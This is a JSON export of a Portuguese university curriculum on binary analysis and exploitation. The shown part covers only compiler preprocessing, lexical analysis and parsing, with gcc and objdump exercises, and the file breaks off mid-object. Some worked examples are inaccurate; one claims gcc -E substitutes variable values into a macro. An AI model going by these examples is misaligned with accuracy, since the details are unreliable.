{
  "formatVersion": "1.0",
  "exportDate": "2025-12-04T21:08:23.321Z",
  "appVersion": "1.0.0",
  "curriculumData": {
    "metadata": {
      "baseOn": "Catálogo dos Cursos de Graduação 2025 - SC-04",
      "lastUpdated": "2025-12-04",
      "totalAtomicSkills": 289
    },
    "areas": [
      {
        "id": "10",
        "name": "Segurança Computacional",
        "description": "Área dedicada ao estudo de técnicas avançadas de análise e exploração de códigos binários em contextos de segurança.",
        "disciplines": [
          {
            "id": "10.1",
            "name": "Análise e Exploração de Códigos Binários",
            "description": "Compilação e geração de código objeto. Assembly 32 e 64 bits: conceitos básicos, chamadas de sistema, acesso a memória. Injeção e execução de código arbitrário: buffer overflow, shellcodes e return-oriented programming. Formato de arquivos executáveis: ELF e PE. Engenharia reversa, alteração e controle de fluxo.",
            "mainTopics": [
              {
                "id": "10.1.1",
                "name": "Compilação e Geração de Código Objeto",
                "description": "Estudo dos processos de compilação e geração de código objeto a partir de código fonte.",
                "totalSkills": 49,
                "atomicTopics": [
                  {
                    "id": "10.1.1.1",
                    "name": "Etapas do Processo de Compilação",
                    "description": "Fases principais: pré-processamento, análise léxica, sintática, semântica, geração de código intermediário e otimização.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.1.1",
                        "name": "Pré-processamento",
                        "description": "Fase inicial do processo de compilação que processa diretivas do pré-processador, como expansão de macros (#define), inclusão de arquivos (#include), remoção de comentários e processamento condicional (#ifdef, #ifndef), gerando um código fonte limpo para as fases subsequentes.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.1.1.1",
                            "name": "Identificar e classificar diretivas de pré-processador",
                            "description": "Reconhecer diretivas comuns em código C/C++ (#include, #define, #ifdef, #ifndef, #pragma) e explicar seu papel na preparação do código fonte para análise em contextos de engenharia reversa de binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Pré-processador e Diretivas",
                                  "subSteps": [
                                    "Estude a definição de pré-processador como a primeira fase da compilação em C/C++.",
                                    "Identifique que diretivas começam com # e são processadas antes da compilação.",
                                    "Revise o fluxo: código fonte → pré-processamento → código expandido → compilação.",
                                    "Analise exemplos simples de como diretivas alteram o código fonte.",
                                    "Discuta o papel na engenharia reversa: diretivas podem remover informações ou condicionar código."
                                  ],
                                  "verification": "Explique em suas palavras o que é pré-processamento e liste 3 impactos em binários.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação GCC (man gcc), editor de texto como VS Code.",
                                  "tips": "Use o comando 'gcc -E arquivo.c' para ver a saída do pré-processador.",
                                  "learningObjective": "Entender o papel fundamental das diretivas na preparação do código.",
                                  "commonMistakes": "Confundir pré-processador com compilador; achar que # são comentários."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Classificar Diretivas de Inclusão e Definição",
                                  "subSteps": [
                                    "Aprenda #include: insere conteúdo de headers no código.",
                                    "Pratique com #include <stdio.h> vs #include \"meuheader.h\".",
                                    "Estude #define: cria macros para constantes ou funções inline.",
                                    "Classifique #define como substituição textual simples.",
                                    "Exemplo: #define PI 3.14 e veja expansão com gcc -E."
                                  ],
                                  "verification": "Escreva um código com #include e #define, execute gcc -E e identifique expansões.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Compilador GCC/Clang, arquivos .c de exemplo, terminal.",
                                  "tips": "Sempre use gcc -E para visualizar mudanças antes de compilar.",
                                  "learningObjective": "Reconhecer e diferenciar #include de #define em código fonte.",
                                  "commonMistakes": "Esquecer aspas vs < > em #include; macros sem parênteses causando precedência errada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Diretivas Condicionais",
                                  "subSteps": [
                                    "Estude #ifdef e #ifndef: compilações condicionais baseadas em símbolos definidos.",
                                    "Aprenda #if, #else, #endif para condições complexas.",
                                    "Crie exemplo: #ifndef DEBUG ... #define DEBUG ... #endif.",
                                    "Classifique como controle de feature flags ou portabilidade.",
                                    "Analise impacto em RE: código condicional pode não aparecer no binário."
                                  ],
                                  "verification": "Modifique um código para incluir/excluir seções com #ifdef e verifique com gcc -E.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Exemplos de código open-source com condicionais (ex: Linux kernel snippets).",
                                  "tips": "Defina símbolos com -D no gcc para testar condicionais.",
                                  "learningObjective": "Classificar diretivas condicionais e seu efeito no código final.",
                                  "commonMistakes": "Esquecer #endif; aninhamento incorreto de condicionais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Diretivas Especiais como #pragma",
                                  "subSteps": [
                                    "Identifique #pragma: diretivas específicas do compilador para otimização ou warnings.",
                                    "Exemplos: #pragma once (evita múltiplas inclusões), #pragma pack (alinhamento).",
                                    "Classifique como não-portáveis, dependentes do compilador.",
                                    "Discuta em RE: #pragma pode alterar layout de structs no binário.",
                                    "Pratique removendo #pragma e comparando binários com objdump."
                                  ],
                                  "verification": "Identifique #pragma em um código real e explique seu impacto no binário gerado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramentas: objdump, hexdump; código C com #pragma.",
                                  "tips": "Use #pragma once em headers para eficiência.",
                                  "learningObjective": "Reconhecer #pragma e seu papel na geração de binários.",
                                  "commonMistakes": "Assumir portabilidade de #pragma; ignorar efeitos em packing de dados."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Identificação em Contextos de Engenharia Reversa",
                                  "subSteps": [
                                    "Analise código fonte real com múltiplas diretivas misturadas.",
                                    "Classifique cada diretiva e preveja o código pós-pré-processamento.",
                                    "Compare com binário: use strings/objdump para vestígios de macros.",
                                    "Simule RE: dado binário, infira diretivas originais ausentes.",
                                    "Crie relatório classificando diretivas por categoria e impacto."
                                  ],
                                  "verification": "Classifique todas diretivas em um snippet de 50 linhas e valide com gcc -E.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Códigos de CTFs ou binários reversíveis, IDA Pro Free ou Ghidra (opcional).",
                                  "tips": "Procure por strings residuais de macros no binário para pistas.",
                                  "learningObjective": "Aplicar classificação de diretivas em cenários de análise binária.",
                                  "commonMistakes": "Ignorar diretivas condicionais que excluem código do binário."
                                }
                              ],
                              "practicalExample": "Código C: #define MAX_SIZE 100\n#include <stdio.h>\n#ifdef DEBUG\n#pragma message(\"Debug mode\")\n#endif\nint main() { printf(\"Size: %d\\n\", MAX_SIZE); } Compile com gcc -E para ver expansão: MAX_SIZE substituído por 100, stdio.h incluído, seção DEBUG condicional removida se não definida.",
                              "finalVerifications": [
                                "Lista corretamente 5 diretivas comuns e suas funções.",
                                "Executa gcc -E em 3 códigos e explica diferenças.",
                                "Classifica diretivas em categorias (inclusão, definição, condicional, especial).",
                                "Identifica impacto de uma diretiva em um binário via objdump.",
                                "Cria macro condicional funcional e testa.",
                                "Explica ausência de código em binário devido a #ifndef."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 90% das diretivas corretas (40%)",
                                "Explicação do papel na compilação: clara e completa (25%)",
                                "Uso correto de gcc -E para verificação (15%)",
                                "Classificação por categoria com exemplos (10%)",
                                "Análise de impacto em RE de binários (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/C++: Entender macros e headers.",
                                "Compiladores: Fases de build e ferramentas como make.",
                                "Segurança: Obfuscação via macros em malware.",
                                "Sistemas Operacionais: Headers do kernel com condicionais.",
                                "Análise de Software: Ferramentas de RE como IDA/Ghidra."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, identificar resquícios de #define obfuscados ajuda a restaurar lógica; em auditoria de binários, #pragma pack revela estruturas de dados mal alinhadas exploráveis; feature flags via #ifdef explicam variações em builds de software proprietário."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.1.2",
                            "name": "Simular a expansão de macros e inclusões",
                            "description": "Executar manualmente ou com ferramentas como gcc -E a expansão de macros e inclusão de headers, comparando o código original com o resultado para entender modificações no fluxo de compilação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar um Código C de Exemplo com Macros e Inclusões",
                                  "subSteps": [
                                    "Crie um arquivo C simples chamado 'exemplo.c' com pelo menos uma macro (#define) e um #include de header padrão como <stdio.h>.",
                                    "Defina uma macro simples, como #define MAX(a,b) ((a)>(b)?(a):(b)), e use-a em uma função.",
                                    "Inclua uma macro condicional (#ifdef DEBUG) para simular código de depuração.",
                                    "Adicione comentários no código original para marcar seções com macros e includes.",
                                    "Salve o arquivo e verifique sintaxe básica com um editor de texto."
                                  ],
                                  "verification": "Abra o arquivo em um editor e confirme que contém macros (#define), includes (#include) e usos visíveis das macros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code, Vim ou Notepad++)",
                                    "Compilador GCC instalado"
                                  ],
                                  "tips": "Use macros condicionais como #ifdef para demonstrar expansões seletivas baseadas em flags.",
                                  "learningObjective": "Entender como estruturar código C para isolar e observar efeitos de pré-processamento.",
                                  "commonMistakes": [
                                    "Esquecer parênteses em macros para evitar precedência errada",
                                    "Não usar comentários para marcar seções",
                                    "Incluir headers desnecessários que poluem a expansão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar o Pré-processador com gcc -E",
                                  "subSteps": [
                                    "Abra o terminal e navegue até o diretório do arquivo 'exemplo.c'.",
                                    "Execute o comando 'gcc -E exemplo.c > exemplo_expandido.i' para gerar o arquivo expandido.",
                                    "Adicione flags opcionais como -DDEBUG=1 para ativar macros condicionais.",
                                    "Verifique se o arquivo 'exemplo_expandido.i' foi gerado sem erros de sintaxe.",
                                    "Use 'gcc -E -v exemplo.c' para ver detalhes verbosos do processo."
                                  ],
                                  "verification": "Confirme a existência do arquivo 'exemplo_expandido.i' e que seu tamanho é maior que o original devido às expansões.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal/Linux ou WSL no Windows",
                                    "GCC instalado (versão 9+ recomendada)"
                                  ],
                                  "tips": "Redirecione a saída para um arquivo (.i) para facilitar a comparação; evite visualizar no terminal se o código for grande.",
                                  "learningObjective": "Dominar o uso da flag -E do GCC para isolar o estágio de pré-processamento.",
                                  "commonMistakes": [
                                    "Executar 'gcc exemplo.c' em vez de 'gcc -E'",
                                    "Esquecer de redirecionar saída com >",
                                    "Não definir flags como -D para macros condicionais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Código Original e Expandido",
                                  "subSteps": [
                                    "Abra 'exemplo.c' e 'exemplo_expandido.i' lado a lado em um editor com diff (como VS Code com extensão diff).",
                                    "Identifique expansões de macros: procure por texto repetido ou substituído.",
                                    "Observe includes resolvidos: headers expandidos inline com suas definições.",
                                    "Anote diferenças em um documento: quais linhas mudaram e por quê.",
                                    "Use ferramentas como 'diff exemplo.c exemplo_expandido.i' no terminal para highlights visuais."
                                  ],
                                  "verification": "Crie uma tabela ou lista anotando pelo menos 3 mudanças específicas (ex: macro expandida, header incluído).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor com suporte a diff (VS Code, Meld)",
                                    "Ferramenta diff no terminal"
                                  ],
                                  "tips": "Ignore linhas de comentários gerados pelo pré-processador (#line) focando no código efetivo.",
                                  "learningObjective": "Desenvolver habilidade em diffing para visualizar transformações do pré-processador.",
                                  "commonMistakes": [
                                    "Confundir comentários #line com código",
                                    "Não notar recursão em macros",
                                    "Ignorar expansões de includes aninhados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto no Fluxo de Compilação",
                                  "subSteps": [
                                    "Compile o expandido com 'gcc exemplo_expandido.i -o exemplo' e compare com compilação direta.",
                                    "Identifique como macros afetam otimização (ex: inline vs função).",
                                    "Simule cenários de erro: crie macro mal definida e observe na expansão.",
                                    "Discuta em notas como pré-processamento afeta análise estática de segurança.",
                                    "Teste execução do binário gerado para validar funcionalidade pós-expansão."
                                  ],
                                  "verification": "Gere um relatório curto explicando 2-3 impactos no fluxo (ex: tamanho do código, detecção de bugs).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC para compilação final",
                                    "Documento para notas (Markdown ou texto)"
                                  ],
                                  "tips": "Use -Wall no gcc final para detectar warnings introduzidos por expansões ruins.",
                                  "learningObjective": "Compreender como pré-processamento altera o código para estágios subsequentes de compilação.",
                                  "commonMistakes": [
                                    "Compilar sem flags de warning",
                                    "Não testar execução final",
                                    "Subestimar overhead de macros complexas"
                                  ]
                                }
                              ],
                              "practicalExample": "Código original (exemplo.c):\n#include <stdio.h>\n#define MAX(a,b) ((a)>(b)?(a):(b))\n#define DEBUG_PRINT(x) printf(\"Debug: %d\\n\", x)\nint main() { int x=5, y=3; DEBUG_PRINT(MAX(x,y)); return 0; }\nExpansão (gcc -E exemplo.c -DDEBUG_PRINT):\n... conteúdo expandido com #include <stdio.h> inline, MAX substituído por ((5)>(3)?(5):(3)), e DEBUG_PRINT expandido para printf(\"Debug: %d\\n\", ((5)>(3)?(5):(3)));",
                              "finalVerifications": [
                                "Explica corretamente a diferença entre código fonte e pré-processado.",
                                "Identifica expansões de pelo menos duas macros em um exemplo dado.",
                                "Compara tamanhos e conteúdos de arquivos original e .i.",
                                "Executa gcc -E sem erros em código com includes aninhados.",
                                "Reconhece impacto de flags como -D em expansões condicionais.",
                                "Gera binário funcional a partir do arquivo expandido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de expansões de macros (90%+ corretas).",
                                "Uso correto de flags gcc -E e redirecionamento de saída.",
                                "Análise detalhada de pelo menos 3 diferenças no diff.",
                                "Relatório de impacto no fluxo de compilação com exemplos.",
                                "Ausência de erros comuns como macros sem parênteses.",
                                "Tempo total dentro de 60 minutos com verificações completas."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários: Entender pré-processamento auxilia reverse engineering de binários C.",
                                "Segurança de Software: Detectar macros maliciosas ou backdoors em includes.",
                                "Programação em C: Diferenciação entre macros e funções inline.",
                                "Lógica Computacional: Expansões revelam precedência e avaliação de expressões.",
                                "Ferramentas de Build: Integração com Makefiles e automação de pré-processamento."
                              ],
                              "realWorldApplication": "Em auditorias de segurança, simular expansões revela vulnerabilidades ocultas em macros (ex: buffer overflows em defines maliciosos) ou configurações condicionais em firmware embarcado; essencial para análise de malwares em C e depuração de builds em projetos open-source como Linux kernel."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.1.3",
                            "name": "Avaliar impacto do pré-processamento no código objeto",
                            "description": "Analisar como expansões de macros e inclusões afetam o tamanho, dependências e strings no binário final (ELF/PE), identificando vestígios remanescentes em ferramentas de reversa como objdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar código-fonte com macros e inclusões para análise",
                                  "subSteps": [
                                    "Escreva um programa C simples que utilize macros (#define) para constantes e funções inline.",
                                    "Inclua headers padrão como <stdio.h> e um header customizado com strings identificáveis.",
                                    "Adicione comentários e strings literais que possam deixar vestígios.",
                                    "Salve o código em um arquivo .c com nome descritivo, como 'preprocess_test.c'.",
                                    "Execute o pré-processador manualmente com 'gcc -E' para gerar o output expandido e compare com o original."
                                  ],
                                  "verification": "Verifique se o output do pré-processador mostra expansões de macros e inclusões inline corretamente, sem erros de sintaxe.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou Vim)",
                                    "Compilador GCC instalado",
                                    "Terminal Linux/Windows com objdump"
                                  ],
                                  "tips": "Use macros com nomes únicos para facilitar rastreamento nos binários; evite otimização excessiva inicialmente.",
                                  "learningObjective": "Compreender como macros e includes são expandidos no estágio de pré-processamento.",
                                  "commonMistakes": [
                                    "Esquecer de usar -E para ver apenas pré-processamento",
                                    "Não incluir strings únicas para rastreamento"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o código em objeto e binário com variações de flags",
                                  "subSteps": [
                                    "Compile o código para objeto sem linking: 'gcc -c preprocess_test.c -o test.o'.",
                                    "Compile para binário executável: 'gcc preprocess_test.c -o test'.",
                                    "Repita com flags de debug (-g) e sem otimização (-O0) para preservar vestígios.",
                                    "Gere versões ELF (Linux) e PE (Windows com MinGW) se possível.",
                                    "Meça o tamanho dos arquivos com 'ls -lh' ou 'stat' antes e depois."
                                  ],
                                  "verification": "Confirme tamanhos dos arquivos .o e executáveis; verifique ausência de erros de compilação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC ou Clang",
                                    "Ferramentas de sistema de arquivos (ls, dir)"
                                  ],
                                  "tips": "Use -save-temps para preservar arquivos intermediários como .i (pré-processado) e .s (assembly).",
                                  "learningObjective": "Observar impactos iniciais no tamanho e estrutura devido ao pré-processamento.",
                                  "commonMistakes": [
                                    "Otimizar com -O2 prematuramente, removendo vestígios",
                                    "Não comparar tamanhos antes/depois"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o código objeto e binário com objdump",
                                  "subSteps": [
                                    "Execute 'objdump -h test.o' para headers e seções (tamanho de .text, .data, .rodata).",
                                    "Use 'objdump -s -j .rodata test' para dump de strings e dados somente-leitura.",
                                    "Procure por vestígios: nomes de macros expandidas, caminhos de includes, strings residuais.",
                                    "Compare dumps de versões com/sem debug: 'objdump -t test' para tabela de símbolos.",
                                    "Identifique dependências em seções como .dynstr ou .comment."
                                  ],
                                  "verification": "Liste pelo menos 3 vestígios (ex: string de header, tamanho aumentado em .rodata).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "objdump (parte de binutils)",
                                    "Hex editor opcional como xxd"
                                  ],
                                  "tips": "Filtre output com grep: 'objdump -s test | grep -i stdio' para strings específicas.",
                                  "learningObjective": "Identificar artefatos do pré-processamento em formatos ELF/PE.",
                                  "commonMistakes": [
                                    "Ignorar seções .rodata e .comment",
                                    "Não usar -j para seções específicas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar e comparar impactos quantitativamente",
                                  "subSteps": [
                                    "Compare tamanhos de seções entre .o original e pós-pré-processamento usando scripts ou diff.",
                                    "Quantifique dependências: conte símbolos importados de includes.",
                                    "Avalie strings remanescentes: % de código inchado por literais expandidos.",
                                    "Teste stripping: 'strip test' e reanalise com objdump para ver o que persiste.",
                                    "Documente achados em um relatório: tabela com métricas antes/depois."
                                  ],
                                  "verification": "Crie uma tabela comparativa mostrando pelo menos delta de 10% em tamanho ou 2 dependências novas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Planilha ou Markdown para tabela",
                                    "strip utility"
                                  ],
                                  "tips": "Automatize com script bash: diff de objdump outputs.",
                                  "learningObjective": "Quantificar efeitos no binário final para análise de segurança.",
                                  "commonMistakes": [
                                    "Não considerar stripping ou otimização",
                                    "Focar só em tamanho, ignorar dependências"
                                  ]
                                }
                              ],
                              "practicalExample": "Código C: #define DEBUG_MSG \"Pré-processado!\" #include <stdio.h> int main() { printf(\"%s\\n\", DEBUG_MSG); return 0; }. Após gcc -E: expande para printf(\"Pré-processado!\\n\"). Objdump -s mostra 'Pré-processado!' em .rodata, aumentando tamanho em ~20 bytes; include <stdio.h> deixa dependência em .dynsym.",
                              "finalVerifications": [
                                "Identifica strings de macros/includes em .rodata via objdump.",
                                "Compara tamanhos de seções pré/pós-pré-processamento com variação >10%.",
                                "Lista dependências novas em tabela de símbolos.",
                                "Detecta vestígios persistentes após strip.",
                                "Explica impacto em ELF vs PE."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de vestígios (90%+ cobertura).",
                                "Análise quantitativa completa (tamanhos, contagens).",
                                "Uso correto de objdump flags e interpretação.",
                                "Relatório claro com tabelas/comparações.",
                                "Compreensão de implicações para reversa.",
                                "Ausência de erros comuns como otimização precoce."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de diretivas do pré-processador.",
                                "Engenharia Reversa: Uso de disassemblers como objdump/IDA.",
                                "Segurança de Software: Análise de binários para malware.",
                                "Sistemas Operacionais: Formatos ELF/PE e linking dinâmico."
                              ],
                              "realWorldApplication": "Em análise forense de malware, identificar origens de código via strings residuais de includes (ex: caminhos de SDKs), estimar tamanho inchado por macros obfuscadas, e mapear dependências para exploits em binários reais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.1.2",
                        "name": "Análise Front-End: Léxica, Sintática e Semântica",
                        "description": "Fases que transformam o código fonte em representação estruturada: análise léxica gera tokens, sintática constrói árvore de análise (parse tree) verificando gramática, e semântica valida tipos, escopo e significados, detectando erros lógicos.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.1.2.1",
                            "name": "Descrever o funcionamento do scanner léxico",
                            "description": "Explicar como o lexer divide o código em tokens (identificadores, operadores, literais) e identificar tokens em exemplos de código fonte relevantes para geração de assembly 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito Básico do Scanner Léxico",
                                  "subSteps": [
                                    "Defina o scanner léxico como a primeira fase da análise front-end que converte código fonte em sequência de tokens.",
                                    "Explique o papel do lexer no pipeline de compilação: remover whitespace, comentários e dividir em unidades léxicas.",
                                    "Diferencie lexer de parser: lexer foca em análise linear, parser em estrutura hierárquica.",
                                    "Relacione com geração de assembly: tokens servem de base para código objeto em 32/64 bits.",
                                    "Estude diagramas de fluxo de um lexer simples usando autômatos finitos."
                                  ],
                                  "verification": "Escreva uma definição em suas palavras e desenhe um fluxograma básico do processo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação de compiladores (ex: Dragon Book PDF), editor de texto para notas.",
                                  "tips": "Use analogia de 'quebrar texto em palavras' para visualizar o processo.",
                                  "learningObjective": "Compreender o propósito e posição do lexer no compilador.",
                                  "commonMistakes": "Confundir lexer com parser ou ignorar remoção de whitespace/comentários."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar os Principais Tipos de Tokens",
                                  "subSteps": [
                                    "Liste tokens comuns: identificadores (variáveis, funções), operadores (+, =, etc.), literais (números, strings), palavras-chave (int, return).",
                                    "Classifique tokens por categoria com exemplos em C: 'int' (keyword), 'x' (identifier), '5' (literal).",
                                    "Discuta tokens especiais para assembly: labels, registradores (eax, rax em 32/64 bits).",
                                    "Identifique delimitadores: ;, {, }, (, ).",
                                    "Pratique rotulando 10 tokens de um snippet curto."
                                  ],
                                  "verification": "Crie uma tabela com 5 exemplos de cada tipo de token de um código C simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Exemplos de código C, planilha ou tabela em Markdown.",
                                  "tips": "Lembre-se: tokens são a 'granularidade mínima' reconhecível pela linguagem.",
                                  "learningObjective": "Reconhecer e categorizar tokens corretamente.",
                                  "commonMistakes": "Classificar operadores como identificadores ou ignorar case-sensitivity."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender o Processo de Tokenização",
                                  "subSteps": [
                                    "Descreva o algoritmo: leitura caractere por caractere, matching de padrões via DFA/NFA.",
                                    "Explique estados: estado inicial, estados de aceitação para cada token type.",
                                    "Detalhe handling de longest match: escolher o token mais longo possível.",
                                    "Aborde erros léxicos: caracteres inválidos, números malformados.",
                                    "Simule tokenização manual de uma linha de código."
                                  ],
                                  "verification": "Simule tokenização de uma linha e liste tokens com posições.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramenta online de lexer (ex: Lex/Flex demo), papel e caneta para simulação.",
                                  "tips": "Pense como um 'leitor ávido': avance até encontrar uma palavra completa.",
                                  "learningObjective": "Modelar o fluxo sequencial de divisão em tokens.",
                                  "commonMistakes": "Parar no primeiro match em vez de longest match, ex: '==' vs '='."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Exemplos Relevantes para Assembly 32/64 bits",
                                  "subSteps": [
                                    "Pegue código C: 'int main() { int x=5; return x; }' e liste todos os tokens.",
                                    "Compare com assembly gerado (use godbolt.org para x86-32/64).",
                                    "Identifique como tokens de literais viram mov eax,5 em 32 bits.",
                                    "Analise código com operadores: 'x += 1;' → tokens e impacto em add eax,1.",
                                    "Crie seu próprio exemplo e tokenizen."
                                  ],
                                  "verification": "Tokenize 2 snippets C e correlacione 3 tokens com instruções assembly.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Compiler Explorer (godbolt.org), snippets de C para x86.",
                                  "tips": "Foque em como lexer ignora {} mas preserva ; para controle de fluxo.",
                                  "learningObjective": "Aplicar tokenização a códigos que geram assembly.",
                                  "commonMistakes": "Omitir whitespace como separadores ou confundir literais com IDs."
                                }
                              ],
                              "practicalExample": "Código C: int main() { int x = 5 + y; return 0; }\nTokens: [int, main, (, ), {, int, x, =, 5, +, y, ;, return, 0, ;, }]\nEm assembly 64 bits (aprox): mov rax, 5; add rax, [y]; ret",
                              "finalVerifications": [
                                "Explicar corretamente o papel do lexer no front-end.",
                                "Listar e categorizar todos os tokens de um snippet C de 5 linhas.",
                                "Simular tokenização manual sem erros de longest match.",
                                "Correlacionar 5 tokens com instruções assembly em x86-32/64.",
                                "Identificar e corrigir um erro léxico em código fornecido.",
                                "Desenhar fluxograma de um lexer simples."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos de tokens (90%+ correto).",
                                "Compreensão do longest match e handling de erros.",
                                "Correlação lógica entre tokens fonte e assembly gerado.",
                                "Detalhe nos substeps e verificações por step.",
                                "Uso correto de exemplos relevantes para 32/64 bits.",
                                "Clareza na explicação do processo sequencial."
                              ],
                              "crossCurricularConnections": [
                                "Teoria da Computação: Autômatos Finitos e Linguagens Regulares.",
                                "Programação: Parsing em linguagens como Python (tokenize module).",
                                "Segurança Computacional: Análise léxica em desofuscação de malware.",
                                "Arquitetura de Computadores: Mapeamento de tokens para instruções x86."
                              ],
                              "realWorldApplication": "Em compiladores como GCC/Clang para gerar assembly 32/64 bits; em ferramentas de RE como IDA Pro para análise léxica de código fonte ofuscado; em scanners de vulnerabilidades para detectar padrões maliciosos via tokenização inicial."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.2",
                            "name": "Explicar análise sintática e árvores de parsing",
                            "description": "Detalhar o uso de gramáticas livres de contexto e parsers (LL, LR) para validar estrutura, construindo árvores sintáticas e relacionando com controle de fluxo em binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Gramáticas Livres de Contexto (CFG) e Análise Sintática",
                                  "subSteps": [
                                    "Estude a definição formal de uma CFG: G = (V, T, P, S), identificando variáveis (V), terminais (T), produções (P) e símbolo inicial (S).",
                                    "Analise exemplos de CFGs para linguagens simples, como expressões aritméticas (E → E + T | T, T → T * F | F, F → (E) | id).",
                                    "Diferencie análise sintática de léxica: sintática verifica estrutura hierárquica via regras de produção.",
                                    "Pratique derivando strings a partir de CFGs usando derivações esquerda e direita.",
                                    "Explore ambiguidade em CFGs e como ela afeta o parsing."
                                  ],
                                  "verification": "Construa uma CFG simples para expressões booleanas e derive uma string válida, explicando cada passo.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Livro 'Compilers: Principles, Techniques, and Tools' (Dragon Book), capítulos 4; Ferramenta online JFLAP para simular CFGs"
                                  ],
                                  "tips": [
                                    "Comece com CFGs regulares antes de ambiguidades; use diagramas para visualizar produções."
                                  ],
                                  "learningObjective": "Compreender os fundamentos de CFGs e seu papel na validação de estrutura sintática.",
                                  "commonMistakes": [
                                    "Confundir terminais com variáveis; ignorar o símbolo inicial; não detectar ambiguidade."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir Árvores de Parsing (Parse Trees)",
                                  "subSteps": [
                                    "Desenhe árvores de parsing para derivações esquerda e direita de uma string em uma CFG.",
                                    "Identifique folhas (terminais) e nós internos (não-terminais) na árvore, mostrando hierarquia sintática.",
                                    "Construa árvores para expressões aninhadas, destacando precedência e associatividade.",
                                    "Compare árvores leftmost e rightmost derivations para a mesma string.",
                                    "Use ferramentas para gerar árvores automaticamente e valide manualmente."
                                  ],
                                  "verification": "Gere a árvore de parsing para 'id + id * id' usando a CFG de expressões aritméticas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "JFLAP ou ANTLR para visualização de árvores; Papel e lápis para desenhos manuais"
                                  ],
                                  "tips": [
                                    "Sempre rotule nós com produções usadas; verifique se a fronteira da árvore forma a string de entrada."
                                  ],
                                  "learningObjective": "Dominar a construção e interpretação de árvores sintáticas para representar estrutura de código.",
                                  "commonMistakes": [
                                    "Erros em precedência (ex: tratar + e * como mesma nível); desenhar árvores incompletas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Parsers LL e LR",
                                  "subSteps": [
                                    "Estude parsers top-down (LL): PREDICT sets, FIRST e FOLLOW para LL(1), construa tabela de parsing.",
                                    "Implemente um parser LL(1) simples para expressões em Python ou pseudocódigo.",
                                    "Analise parsers bottom-up (LR): itens LR, automatos, shift-reduce conflicts, construa tabela LR(1).",
                                    "Compare LL vs LR: LL para gramáticas left-recursive free, LR mais poderoso para CFGs gerais.",
                                    "Simule parsing de uma string com erros e observe recuperação."
                                  ],
                                  "verification": "Construa tabela LL(1) para uma CFG simples e parse uma string válida/inválida.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Dragon Book capítulos 4.4-4.6; Implementação em Python com bibliotecas como PLY ou Lark"
                                  ],
                                  "tips": [
                                    "Use FIRST/FOLLOW para eliminar conflitos; teste com gramáticas left-factored."
                                  ],
